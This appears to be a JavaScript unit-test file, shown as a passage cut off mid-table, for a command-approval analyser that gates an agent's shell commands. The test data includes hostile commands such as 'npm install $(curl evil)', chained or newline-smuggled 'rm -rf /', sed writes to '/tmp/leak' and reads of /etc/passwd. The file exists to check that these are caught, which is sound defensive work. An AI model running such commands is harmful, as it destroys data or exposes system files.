//     ▄▄ ▄▄ ▄▄  ▄▄▄▄  ▄▄▄▄ ▄▄    ▄▄▄▄▄ ▄▄▄▄
//     ██ ██ ██ ██ ▄▄ ██ ▄▄ ██    ██▄▄  ██▄█▄   Copyright (c) 2026 Julian Storer
//   ▄▄█▀ ▀███▀ ▀███▀ ▀███▀ ██▄▄▄ ██▄▄▄ ██ ██   Apache-2.0 - see LICENSE
// SPDX-License-Identifier: Apache-2.0

/**
 * Unit tests for the static command-approval analyser.
 *
 * Tests `isCommandAutoApproved` directly with table-driven cases covering:
 *   - the trivially-safe builtin whitelist
 *   - pipeline / redirect tail-stripping
 *   - leading `cd <path-in-project> &&` stripping
 *   - top-level `&&`/`||`/`;` segmentation (every segment must pass)
 *   - pattern fallback through the glob matcher
 *   - Windows shape-check rejection of cmd.exe / PowerShell native tokens
 *   - tokenizer security edges: command substitution, backticks, expansions,
 *     heredocs, unmatched quotes, escape sequences
 *   - multi-line scripts: an unquoted newline is a `;` separator, a
 *     backslash-newline is a line continuation
 * @module unit-tests/bash-command-approval-unit-test
 */

import { isCommandAutoApproved, isCatastrophicDeletion, suggestApprovalPatterns, tokenize, posixNormalize, matchesGlob, isGrantableRoot, isPathInsideAllowedRoots } from '../context-items/execute/command-approval.js';
import ExecuteContextItem from '../context-items/execute-context-item.js';

const PROJECT_ROOT = '/Users/jules/code/juggler';
const TEST_HOME = '/Users/jules';

/**
 * Interpreters the suggestion engine must never wildcard. A small stand-in for
 * `ExecuteContextItem.UNIX_INTERPRETERS` — enough to assert the exact-only tier.
 */
const TEST_INTERPRETERS = new Set(['bash', 'sh', 'zsh', 'python', 'python3', 'node', 'ruby', 'perl']);

/**
 * @typedef {object} ApprovalCase
 * @property {string} name human-readable label for the case
 * @property {string} command the command line being tested
 * @property {string[]} patterns glob patterns already approved
 * @property {string} [platform] platform identifier string (default 'darwin')
 * @property {string[]} [allowedRoots] allowed roots (default [PROJECT_ROOT])
 * @property {boolean} [writeEnabled] whether file-writing is permitted
 * @property {string} [cwd] directory the command runs in (default PROJECT_ROOT)
 * @property {boolean} expected whether the command should auto-approve
 * @property {boolean} [expectedNoCwd] expectation when no working directory is
 *   known (default: same as `expected`)
 */

/** @type {ApprovalCase[]} */
const CASES = [
  // === Plan table 1–18 ===
  { name: 'cd into project + make build matches make *',
    command: 'cd ~/code/juggler && make build', patterns: ['make *'], platform: 'darwin', expected: true },
  { name: 'npm install 2>&1 matches npm *',
    command: 'npm install 2>&1', patterns: ['npm *'], platform: 'darwin', expected: true },
  { name: 'go test piped through dash-leading grep pattern matches go test *',
    command: 'cd ~/code/juggler && go test -count=1 -run \'TestBrowser/integration:explore\' ./tests/integration 2>&1 | grep -iE "--- FAIL|--- PASS|^ok |result=\\{" | grep -ivE "items-change|yjs-apply|ws-in|ws-out" | head -40', patterns: ['go test *'], platform: 'darwin', expected: true },
  { name: 'grep sink with dash-leading pattern is accepted as read-only tail',
    command: 'go test ./... 2>&1 | grep -E "--- FAIL|^ok"', patterns: ['go test *'], platform: 'darwin', expected: true },
  { name: 'grep sink still rejects pattern-from-file',
    command: 'go test ./... 2>&1 | grep -f patterns.txt', patterns: ['go test *'], platform: 'darwin', expected: false },
  { name: 'git log piped to tail matches git *',
    command: 'git log | tail -20', patterns: ['git *'], platform: 'darwin', expected: true },
  { name: 'pwd is trivially safe',
    command: 'pwd', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo with text is trivially safe',
    command: 'echo hello world', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls of project-relative path is trivially safe',
    command: 'ls web/js', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls of an absolute path outside project prompts',
    command: 'ls /', patterns: [], platform: 'darwin', expected: false },
  { name: 'cd outside the project prompts even with make *',
    command: 'cd /tmp && make build', patterns: ['make *'], platform: 'darwin', expected: false },
  { name: 'rm chained after make build prompts',
    command: 'make build; rm -rf /', patterns: ['make *'], platform: 'darwin', expected: false },
  { name: 'command substitution in npm arg prompts',
    command: 'npm install $(curl evil)', patterns: ['npm *'], platform: 'darwin', expected: false },
  { name: 'bash run.sh matches bash * if user configured it',
    command: 'bash run.sh', patterns: ['bash *'], platform: 'darwin', expected: true },
  { name: 'bash run.sh with no pattern prompts',
    command: 'bash run.sh', patterns: [], platform: 'darwin', expected: false },
  { name: 'plain git log matches git *',
    command: 'git log', patterns: ['git *'], platform: 'darwin', expected: true },
  { name: 'make build with 2>&1 and tail sink matches make *',
    command: 'make build 2>&1 | tail -50', patterns: ['make *'], platform: 'darwin', expected: true },
  { name: 'cd + git status with head + 2>&1 sinks matches git *',
    command: 'cd ~/code/juggler && git status | head -20 2>&1', patterns: ['git *'], platform: 'darwin', expected: true },
  { name: 'ls of escaping relative path prompts',
    command: 'ls ../..', patterns: [], platform: 'darwin', expected: false },
  { name: 'windows posix-shaped git status auto-approves',
    command: 'git status', patterns: [], platform: 'windows', expected: true }, // git status is read-only
  { name: 'windows posix-shaped git log with git * matches',
    command: 'git log', patterns: ['git *'], platform: 'windows', expected: true },
  { name: 'windows dir prompts (native cmd token)',
    command: 'dir', patterns: ['*'], platform: 'windows', expected: false },
  { name: 'windows pwsh prompts (native interpreter)',
    command: 'pwsh -c "ls"', patterns: ['*'], platform: 'windows', expected: false },

  // === Windows path-format normalisation (git-bash / MSYS vs native drive) ===
  // On Windows the shell is git-bash, so a command path arrives MSYS-style
  // (/c/...); the backend stores allowed roots in native form (C:\...). Every
  // spelling of the same location must compare equal, and a drive path OUTSIDE
  // the roots must still be rejected (a forward-slash C:/ path must not be
  // mistaken for a relative in-project path).
  { name: 'windows: leading cd to /c/ project + make build 2>&1|tail matches make * (the reported command)',
    command: 'cd /c/Users/jules/code/juggler && make build 2>&1 | tail -40', patterns: ['make *'], platform: 'windows',
    allowedRoots: ['C:\\Users\\jules\\code\\juggler'], expected: true },
  { name: 'windows: git-bash /c/ path inside a native C:\\ root auto-approves',
    command: 'ls /c/Users/jules/code/juggler/web', patterns: [], platform: 'windows',
    allowedRoots: ['C:\\Users\\jules\\code\\juggler'], expected: true },
  { name: 'windows: forward-slash C:/ command path inside native root auto-approves',
    command: 'cat C:/Users/jules/code/juggler/README.md', patterns: [], platform: 'windows',
    allowedRoots: ['C:\\Users\\jules\\code\\juggler'], expected: true },
  { name: 'windows: forward-slash C:/ path OUTSIDE roots prompts (no relative-path over-approval)',
    command: 'ls C:/Windows/System32', patterns: [], platform: 'windows',
    allowedRoots: ['C:\\Users\\jules\\code\\juggler'], expected: false },
  { name: 'linux git log matches git *',
    command: 'git log', patterns: ['git *'], platform: 'linux', expected: true },

  // === Tokenizer security edges ===
  { name: 'backtick subshell prompts',
    command: 'echo `whoami`', patterns: ['echo *'], platform: 'darwin', expected: false },
  { name: 'unquoted $VAR routes to pattern-only approval: no pattern prompts',
    command: 'echo $HOME', patterns: [], platform: 'darwin', expected: false },
  { name: 'unquoted $VAR auto-approves under an explicit echo * grant',
    command: 'echo $HOME', patterns: ['echo *'], platform: 'darwin', expected: true },
  { name: 'newline-separated commands prompt when one segment is unsafe',
    command: 'echo hi\nrm -rf /', patterns: ['echo *'], platform: 'darwin', expected: false },
  { name: 'unterminated heredoc (no body) prompts',
    command: 'cat <<EOF', patterns: ['*'], platform: 'darwin', expected: false },
  // A terminated heredoc is an inert input redirect: the body is stripped and
  // the command is analysed as if it weren't there. An interpreter fed from a
  // heredoc (`python3 - <<PY … PY`) reduces to `python3 -`, still never
  // auto-approved without a matching pattern.
  { name: 'interpreter heredoc reduces to the command, still prompts',
    command: "python3 - <<'PY'\nprint(1)\nPY", patterns: [], platform: 'darwin', expected: false },
  { name: 'interpreter heredoc auto-approves under a matching pattern',
    command: "python3 - <<'PY'\nprint(1)\nPY", patterns: ['python3 *'], platform: 'darwin', expected: true },
  // The heredoc body is inert data — a dangerous-looking line inside it must
  // NOT affect the decision; only the command (`cat foo.txt`) is judged.
  { name: 'heredoc body is inert data, command judged in isolation',
    command: 'cat foo.txt <<EOF\nrm -rf /\nEOF', patterns: [], platform: 'darwin', expected: true },
  // Parsing resumes after the closing delimiter: a real unsafe command chained
  // after the heredoc is still caught.
  { name: 'command chained after a heredoc terminator is still analysed',
    command: 'cat foo.txt <<EOF\nhello\nEOF\nrm -rf /', patterns: [], platform: 'darwin', expected: false },
  { name: 'unmatched single quote prompts',
    command: "echo 'hello", patterns: ['echo *'], platform: 'darwin', expected: false },
  { name: 'unmatched double quote prompts',
    command: 'echo "hello', patterns: ['echo *'], platform: 'darwin', expected: false },
  { name: 'single-quoted semicolon stays inside the segment',
    command: "echo ';'", patterns: [], platform: 'darwin', expected: true },
  { name: 'compound with empty trailing segment prompts',
    command: 'pwd &&', patterns: [], platform: 'darwin', expected: false },
  { name: 'cd with .. escape prompts',
    command: 'cd ../../etc && ls', patterns: [], platform: 'darwin', expected: false },
  { name: 'echo with $() inside double quotes prompts',
    command: 'echo "$(whoami)"', patterns: ['echo *'], platform: 'darwin', expected: false },

  // === Trivially-safe arg whitelists ===
  { name: 'uname -a is safe',
    command: 'uname -a', patterns: [], platform: 'darwin', expected: true },
  { name: 'uname with bogus flag prompts',
    command: 'uname -Z', patterns: [], platform: 'darwin', expected: false },
  { name: 'ls -la web is safe',
    command: 'ls -la web', patterns: [], platform: 'darwin', expected: true },
  { name: 'tail -n 50 file is safe',
    command: 'tail -n 50 README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'tail of escaping path prompts',
    command: 'tail -n 5 ../etc/passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'which command is safe',
    command: 'which git', patterns: [], platform: 'darwin', expected: true },

  // === ls liberalisations ===
  { name: 'ls -al is safe',
    command: 'ls -al', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls -laR web is safe',
    command: 'ls -laR web', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls --color=auto is safe',
    command: 'ls --color=auto', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls -al web/js src is safe (multiple paths)',
    command: 'ls -al web/js .', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls --bogus prompts',
    command: 'ls --bogus', patterns: [], platform: 'darwin', expected: false },
  { name: 'ls web -la is safe (flags after the path)',
    command: 'ls web -la', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls -- web is safe (-- ends the flag prefix)',
    command: 'ls -- web', patterns: [], platform: 'darwin', expected: true },
  { name: 'ls -- /etc prompts (the operand after -- is still contained)',
    command: 'ls -- /etc', patterns: [], platform: 'darwin', expected: false },

  // === find ===
  { name: 'find . -name *.js is safe',
    command: 'find . -name *.js', patterns: [], platform: 'darwin', expected: true },
  { name: 'find web -type f -name *.js is safe',
    command: 'find web -type f -name *.js', patterns: [], platform: 'darwin', expected: true },
  { name: 'find web -maxdepth 2 -name *.js -print is safe',
    command: 'find web -maxdepth 2 -name *.js -print', patterns: [], platform: 'darwin', expected: true },
  { name: 'find with -exec prompts (forbidden)',
    command: 'find . -name *.js -exec rm {} +', patterns: [], platform: 'darwin', expected: false },
  { name: 'find with -delete prompts (forbidden)',
    command: 'find . -name *.tmp -delete', patterns: [], platform: 'darwin', expected: false },
  { name: 'find with -fprint prompts (forbidden)',
    command: 'find . -fprint out.txt', patterns: [], platform: 'darwin', expected: false },
  { name: 'find of /etc prompts (outside project)',
    command: 'find /etc -name passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'find with -execdir prompts',
    command: 'find . -execdir touch x \\;', patterns: [], platform: 'darwin', expected: false },
  { name: 'find with unknown predicate prompts',
    command: 'find . -magic-flag x', patterns: [], platform: 'darwin', expected: false },
  { name: 'find -newer file is safe',
    command: 'find . -name "*.log" -newer marker.txt', patterns: [], platform: 'darwin', expected: true },
  { name: 'find -newermt time spec is safe',
    command: 'find . -maxdepth 4 -name "server*.log" -newermt "2026-08-28"', patterns: [], platform: 'darwin', expected: true },
  { name: 'find -newerat / -newerct / -newerBt time specs are safe',
    command: 'find . -newerct "2026-08-28" -o -newerBt "2026-08-28" -o -newerat "2026-08-28"', patterns: [], platform: 'darwin', expected: true },
  { name: 'find -newermt without its value prompts',
    command: 'find . -newermt', patterns: [], platform: 'darwin', expected: false },
  { name: 'find -newermt with bogus trailing letter prompts',
    command: 'find . -newermtz "2026-08-28"', patterns: [], platform: 'darwin', expected: false },

  // === redirect safety ===
  { name: 'echo > /tmp/file prompts (writes outside project)',
    command: 'echo hi > /tmp/file', patterns: ['echo *'], platform: 'darwin', expected: false },
  { name: 'echo > local-file prompts (we don\'t auto-approve any writes)',
    command: 'echo hi > local-file', patterns: ['echo *'], platform: 'darwin', expected: false },
  { name: 'echo >> local-file prompts',
    command: 'echo hi >> local-file', patterns: ['echo *'], platform: 'darwin', expected: false },
  { name: 'echo > /dev/null is safe (sink)',
    command: 'echo hi > /dev/null', patterns: [], platform: 'darwin', expected: true },
  { name: 'make build 2> errors.log prompts',
    command: 'make build 2> errors.log', patterns: ['make *'], platform: 'darwin', expected: false },
  { name: 'cmd & (background) prompts',
    command: 'pwd &', patterns: [], platform: 'darwin', expected: false },

  // === stat / file ===
  { name: 'stat README.md is safe',
    command: 'stat README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'stat -L README.md is safe',
    command: 'stat -L README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'stat -c %s README.md is safe (GNU format)',
    command: 'stat -c %s README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'file README.md is safe',
    command: 'file README.md', patterns: [], platform: 'darwin', expected: true },

  // === du (disk usage, read-only) ===
  { name: 'du of project-relative path is safe',
    command: 'du web/js', patterns: [], platform: 'darwin', expected: true },
  { name: 'bare du (defaults to cwd) is safe',
    command: 'du', patterns: [], platform: 'darwin', expected: true },
  { name: 'du -sh web is safe (clustered short flags)',
    command: 'du -sh web', patterns: [], platform: 'darwin', expected: true },
  { name: 'du -d 2 web/js is safe (-d takes a value)',
    command: 'du -d 2 web/js', patterns: [], platform: 'darwin', expected: true },
  { name: 'du --max-depth=1 -h is safe (long valued flag with =)',
    command: 'du --max-depth=1 -h', patterns: [], platform: 'darwin', expected: true },
  { name: 'du -h web/js .  multiple paths is safe',
    command: 'du -h web/js .', patterns: [], platform: 'darwin', expected: true },
  { name: 'du of absolute path outside project prompts',
    command: 'du /', patterns: [], platform: 'darwin', expected: false },
  { name: 'du of escaping relative path prompts',
    command: 'du ../..', patterns: [], platform: 'darwin', expected: false },
  { name: 'du --bogus prompts (unknown flag)',
    command: 'du --bogus web', patterns: [], platform: 'darwin', expected: false },
  { name: 'du -b outside path still prompts (-b is boolean, not a value flag)',
    command: 'du -b /', patterns: [], platform: 'darwin', expected: false },
  { name: 'find piped to xargs du -sh is safe',
    command: 'find web -type f | xargs du -sh', patterns: [], platform: 'darwin', expected: true },
  { name: 'du -X /etc/excludes prompts (exclude-from file outside project)',
    command: 'du -X /etc/excludes web', patterns: [], platform: 'darwin', expected: false },
  { name: 'du web -sh is safe (flags after the path)',
    command: 'du web -sh', patterns: [], platform: 'darwin', expected: true },
  { name: 'du -- web is safe (-- ends the flag prefix)',
    command: 'du -- web', patterns: [], platform: 'darwin', expected: true },
  { name: 'du -- /etc prompts (the operand after -- is still contained)',
    command: 'du -- /etc', patterns: [], platform: 'darwin', expected: false },
  { name: 'du -d x prompts (-d takes a depth, not a word)',
    command: 'du -d x web', patterns: [], platform: 'darwin', expected: false },

  // === binary/dump readers (strings, od, xxd, hexdump) ===
  { name: 'strings of an in-project binary is safe',
    command: 'strings bin/juggler', patterns: [], platform: 'darwin', expected: true },
  { name: 'strings -n 8 -t x is safe (both flags take a value)',
    command: 'strings -n 8 -t x bin/juggler', patterns: [], platform: 'darwin', expected: true },
  { name: 'strings of a path outside the project prompts',
    command: 'strings /usr/bin/env', patterns: [], platform: 'darwin', expected: false },
  { name: 'strings @argfile prompts (arguments read from an unseen file)',
    command: 'strings @args.txt', patterns: [], platform: 'darwin', expected: false },
  { name: 'strings as a pipeline sink is safe (flags only, no operand)',
    command: 'cat bin/juggler | strings -n 8', patterns: [], platform: 'darwin', expected: true },
  { name: 'strings sink with its own file operand prompts',
    command: 'cat bin/juggler | strings /etc/hosts', patterns: [], platform: 'darwin', expected: false },
  { name: 'od -A x -t x1 of an in-project file is safe',
    command: 'od -A x -t x1 README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'xxd -l 64 of an in-project file is safe',
    command: 'xxd -l 64 README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'xxd with a second operand prompts (it is an OUTPUT file)',
    command: 'xxd README.md dump.hex', patterns: [], platform: 'darwin', expected: false },
  { name: 'xxd -p piped to head is safe',
    command: 'xxd -p README.md | head -5', patterns: [], platform: 'darwin', expected: true },
  { name: 'hexdump -C of an in-project file is safe',
    command: 'hexdump -C README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'hexdump -f format-file prompts (format read from a file)',
    command: 'hexdump -f fmt.txt README.md', patterns: [], platform: 'darwin', expected: false },

  // === read-only text filters (nl, tac, rev, fold, expand, paste, join, column) ===
  { name: 'nl -b a of an in-project file is safe',
    command: 'nl -b a README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'tac piped to head is safe',
    command: 'tac README.md | head -5', patterns: [], platform: 'darwin', expected: true },
  { name: 'rev of an in-project file is safe',
    command: 'rev README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'rev with any flag prompts (rev takes none)',
    command: 'rev -x README.md', patterns: [], platform: 'darwin', expected: false },
  { name: 'fold -w 80 is safe',
    command: 'fold -w 80 README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'expand -t 4 is safe',
    command: 'expand -t 4 README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'unexpand -a is safe',
    command: 'unexpand -a README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'paste -d , of two in-project files is safe',
    command: 'paste -d , a.txt b.txt', patterns: [], platform: 'darwin', expected: true },
  { name: 'join -1 1 -2 1 of two in-project files is safe',
    command: 'join -1 1 -2 1 a.txt b.txt', patterns: [], platform: 'darwin', expected: true },
  { name: 'column -t -s , is safe',
    command: 'column -t -s , data.csv', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep piped to column -t is safe (sink)',
    command: 'grep -rn TODO web | column -t', patterns: [], platform: 'darwin', expected: true },
  { name: 'cat | tac | nl | head chain is safe (every stage a read-only sink)',
    command: 'cat README.md | tac | nl | head -20', patterns: [], platform: 'darwin', expected: true },

  // === checksums (read-only: digest prints, -c verifies) ===
  { name: 'shasum -a 256 of an in-project file is safe',
    command: 'shasum -a 256 README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'sha256sum of an in-project file is safe',
    command: 'sha256sum README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'cksum of an in-project file is safe',
    command: 'cksum README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'md5sum of a file outside the project prompts',
    command: 'md5sum /etc/hosts', patterns: [], platform: 'darwin', expected: false },

  // === comparison (diff, cmp, comm) ===
  { name: 'diff -u of two in-project files is safe',
    command: 'diff -u a.txt b.txt', patterns: [], platform: 'darwin', expected: true },
  { name: 'diff -r of two in-project trees is safe',
    command: 'diff -r web/js web/css', patterns: [], platform: 'darwin', expected: true },
  { name: 'diff -l prompts (pipes its output through pr)',
    command: 'diff -l a.txt b.txt', patterns: [], platform: 'darwin', expected: false },
  { name: 'diff against a file outside the project prompts',
    command: 'diff -u README.md /etc/hosts', patterns: [], platform: 'darwin', expected: false },
  { name: 'cmp -s of two in-project files is safe',
    command: 'cmp -s a.bin b.bin', patterns: [], platform: 'darwin', expected: true },
  { name: 'comm -12 of two in-project files is safe',
    command: 'comm -12 a.txt b.txt', patterns: [], platform: 'darwin', expected: true },

  // === filesystem metadata (realpath, df) ===
  { name: 'realpath of an in-project path is safe',
    command: 'realpath web/js', patterns: [], platform: 'darwin', expected: true },
  { name: 'realpath of a path outside the project prompts',
    command: 'realpath /etc', patterns: [], platform: 'darwin', expected: false },
  { name: 'bare df is safe (no operand, reports every mount)',
    command: 'df -h', patterns: [], platform: 'darwin', expected: true },
  { name: 'df -h . is safe',
    command: 'df -h .', patterns: [], platform: 'darwin', expected: true },
  { name: 'df of a path outside the project prompts',
    command: 'df -h /', patterns: [], platform: 'darwin', expected: false },

  // === string-only commands: operands are text, never opened ===
  { name: 'basename with a suffix is safe',
    command: 'basename web/js/app.js .js', patterns: [], platform: 'darwin', expected: true },
  { name: 'basename of an out-of-project path is safe (it never opens it)',
    command: 'basename /etc/shadow', patterns: [], platform: 'darwin', expected: true },
  { name: 'dirname of an out-of-project path is safe (pure string manipulation)',
    command: 'dirname /etc/shadow', patterns: [], platform: 'darwin', expected: true },
  { name: 'basename --bogus prompts (flags are still whitelisted)',
    command: 'basename --bogus x', patterns: [], platform: 'darwin', expected: false },
  { name: 'seq 1 10 is safe',
    command: 'seq 1 10', patterns: [], platform: 'darwin', expected: true },
  { name: 'seq -5 5 is safe (a negative bound looks like a flag)',
    command: 'seq -5 5', patterns: [], platform: 'darwin', expected: true },
  { name: 'seq -s , 1 10 is safe',
    command: 'seq -s , 1 10', patterns: [], platform: 'darwin', expected: true },

  // === flag-prefix parsing shared by every FlaggedFileReader ===
  { name: 'wc -c FILE counts bytes in FILE (-c is boolean for wc, not a count)',
    command: 'wc -c README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'wc -lw FILE is safe (clustered selectors)',
    command: 'wc -lw web/js/app.js', patterns: [], platform: 'darwin', expected: true },
  { name: 'head -c 100 FILE is safe (-c IS a count for head)',
    command: 'head -c 100 README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'tail -- FILE is safe (-- ends the flag prefix)',
    command: 'tail -- README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'head -n FILE prompts (missing the numeric value)',
    command: 'head -n README.md', patterns: [], platform: 'darwin', expected: false },

  // === grep (top-level and sink) ===
  { name: 'grep with pattern + in-project path is safe',
    command: 'grep TODO README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep -rn in project is safe (recursive defaults to cwd)',
    command: 'grep -rn TODO', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep -r outside project prompts',
    command: 'grep -r TODO /etc', patterns: [], platform: 'darwin', expected: false },
  { name: 'grep -f /etc/patterns prompts (file outside project)',
    command: 'grep -f /etc/patterns README.md', patterns: [], platform: 'darwin', expected: false },
  { name: 'grep --file=/etc/patterns prompts (long form of -f names a file too)',
    command: 'grep --file=/etc/patterns TODO README.md', patterns: [], platform: 'darwin', expected: false },
  { name: 'grep --file /etc/patterns prompts (separate-word long form)',
    command: 'grep --file /etc/patterns TODO README.md', patterns: [], platform: 'darwin', expected: false },
  { name: 'grep --file=patterns.txt in project is safe',
    command: 'grep --file=patterns.txt TODO README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep --exclude-from=/etc/skip prompts (reads the named file)',
    command: 'grep -r --exclude-from=/etc/skip TODO web', patterns: [], platform: 'darwin', expected: false },
  { name: 'grep --exclude is safe (its value is a glob, not a file)',
    command: 'grep -r --exclude="*.min.js" TODO web', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep with unknown long flag prompts',
    command: 'grep --bogus TODO file', patterns: [], platform: 'darwin', expected: false },
  { name: 'echo piped to grep is safe (sink)',
    command: 'echo line | grep line', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo piped to grep -E pattern is safe',
    command: 'echo line | grep -E "li.*"', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo piped to grep -f FILE prompts (no file reads in sink)',
    command: 'echo line | grep -f patterns.txt', patterns: [], platform: 'darwin', expected: false },
  { name: 'echo piped to grep --exclude-from FILE prompts (still a file read)',
    command: 'echo line | grep --exclude-from=skip.txt line', patterns: [], platform: 'darwin', expected: false },
  { name: 'echo piped to grep -e PATTERN is safe (pattern came from the flag)',
    command: 'echo line | grep -e line', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo piped to grep --regexp=PATTERN with a stray operand prompts',
    command: 'echo line | grep --regexp=line extra', patterns: [], platform: 'darwin', expected: false },
  { name: 'cat README.md | grep TODO is safe',
    command: 'cat README.md | grep TODO', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep with backslash-escaped pattern in double quotes (backslashes preserved, not a flag)',
    command: 'grep -nE "\\-\\-bg-(hover|active|raised|secondary)\\s*:" web/css/styles.css | head', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep alternation with backslash-pipe in double quotes is safe',
    command: 'grep -rn "pending\\|PENDING" tests/integration', patterns: [], platform: 'darwin', expected: true },
  { name: 'escaped double-quote inside double quotes tokenizes safely',
    command: 'echo "a\\"b"', patterns: [], platform: 'darwin', expected: true },
  { name: 'cat dotfile + echo + grep-with-escaped-pattern compound auto-approves',
    command: 'cd ~/code/juggler && cat .stylelintrc.json; echo "=== bg check ==="; grep -nE "\\-\\-bg-(hover|active)\\s*:" web/css/styles.css | head', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep chained to tail is safe',
    command: 'grep -rn TODO | tail -n 20', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep -d skip (--directories, value as next arg) is safe',
    command: 'grep -d skip TODO README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep -D skip (--devices, value as next arg) is safe',
    command: 'grep -D skip TODO README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep -nd cluster ending in value-flag d consumes next arg',
    command: 'grep -nd skip TODO README.md', patterns: [], platform: 'darwin', expected: true },

  // === sort ===
  { name: 'grep | sort -u | head pipeline is safe',
    command: 'grep -n TODO web/css/components.css | sort -u | head -40', patterns: [], platform: 'darwin', expected: true },
  { name: 'sort -rn of in-project file is safe',
    command: 'sort -rn web/css/components.css', patterns: [], platform: 'darwin', expected: true },
  { name: 'sort -k 2 -t: (value flags glued + separate) is safe',
    command: 'sort -k2 -t: web/css/components.css', patterns: [], platform: 'darwin', expected: true },
  { name: 'sort -o (writes a file) prompts',
    command: 'sort -o /tmp/out web/css/components.css', patterns: [], platform: 'darwin', expected: false },
  { name: 'sort -- FILE is safe (-- ends the flag prefix)',
    command: 'sort -- web/css/components.css', patterns: [], platform: 'darwin', expected: true },
  { name: 'sort -k prompts (value flag with nothing to take)',
    command: 'sort -k', patterns: [], platform: 'darwin', expected: false },
  { name: 'sort --output= (writes a file) as sink prompts',
    command: 'grep x web/css/components.css | sort --output=/tmp/out', patterns: [], platform: 'darwin', expected: false },
  { name: 'sort --compress-program (runs a program) prompts',
    command: 'grep x web/css/components.css | sort --compress-program=evil', patterns: [], platform: 'darwin', expected: false },
  { name: 'sort on out-of-project file prompts',
    command: 'sort /etc/passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'sort as sink with a file arg prompts',
    command: 'grep x web/css/components.css | sort /etc/passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'big wails compound: grep -oE | sort -u | head auto-approves',
    command: 'cd ~/code/juggler && grep -oE "(Minimise|Maximise|Close|Hide)[A-Za-z]*" 3rdparty/wails/v3/internal/assetserver/bundledassets/runtime.js | sort -u | head -40', patterns: [], platform: 'darwin', expected: true },

  // === sed ===
  { name: 'sed -n line-range print of in-project file is safe',
    command: "sed -n '3975,3990p' web/css/components.css", patterns: [], platform: 'darwin', expected: true },
  { name: 'cd ~/project + sed -n line-range is safe',
    command: "cd ~/code/juggler && sed -n '3975,3990p' web/css/components.css", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed -i (in-place) prompts',
    command: "sed -i 's/foo/bar/' web/css/components.css", patterns: [], platform: 'darwin', expected: false },
  { name: 'sed with `w` write-file command prompts',
    command: "sed -n 'w /tmp/leak' web/css/components.css", patterns: [], platform: 'darwin', expected: false },
  { name: 'sed substitute without w-flag is safe',
    command: "sed 's/foo/bar/g' web/css/components.css", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed substitute with w-flag prompts',
    command: "sed 's/foo/bar/gw /tmp/leak' web/css/components.css", patterns: [], platform: 'darwin', expected: false },
  { name: 'sed -f script-from-file prompts',
    command: 'sed -f /tmp/script.sed web/css/components.css', patterns: [], platform: 'darwin', expected: false },
  { name: 'sed on out-of-project file prompts',
    command: "sed -n '1p' /etc/passwd", patterns: [], platform: 'darwin', expected: false },
  { name: 'sed multi-command script (semicolon-separated) is safe',
    command: "cd ~/code/juggler && sed -n '131,132p;245,260p' 3rdparty/y-crdt/undo_manager.go", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed s/// with `;` inside body is not mis-split',
    command: "sed -n 's/a;b/c/g' web/css/components.css", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed multi-command with an unsafe `w` piece prompts',
    command: "sed -n 'w /tmp/x;1p' web/css/components.css", patterns: [], platform: 'darwin', expected: false },
  // === control flow: for / while / until / if ===
  { name: 'for loop with $VAR inside double quotes auto-approves',
    command: 'for i in a b c; do echo "$i"; done', patterns: [], platform: 'darwin', expected: true },
  { name: 'for loop with bare $VAR and no pattern prompts (handler will not trust an unquoted expansion)',
    command: 'for i in a b c; do echo $i; done', patterns: [], platform: 'darwin', expected: false },
  { name: 'for loop with bare $VAR auto-approves under an explicit echo * grant',
    command: 'for i in a b c; do echo $i; done', patterns: ['echo *'], platform: 'darwin', expected: true },
  { name: 'while true; do ...; done auto-approves when body is safe',
    command: 'while true; do echo hi; done', patterns: [], platform: 'darwin', expected: true },
  { name: 'if/then/else/fi with safe branches auto-approves',
    command: 'if true; then echo yes; else echo no; fi', patterns: [], platform: 'darwin', expected: true },
  { name: 'nested for loops auto-approve',
    command: 'for i in 1 2; do for j in a b; do echo "$i$j"; done; done', patterns: [], platform: 'darwin', expected: true },
  { name: 'mismatched done / fi prompts',
    command: 'for i in 1; do echo "$i"; fi', patterns: [], platform: 'darwin', expected: false },
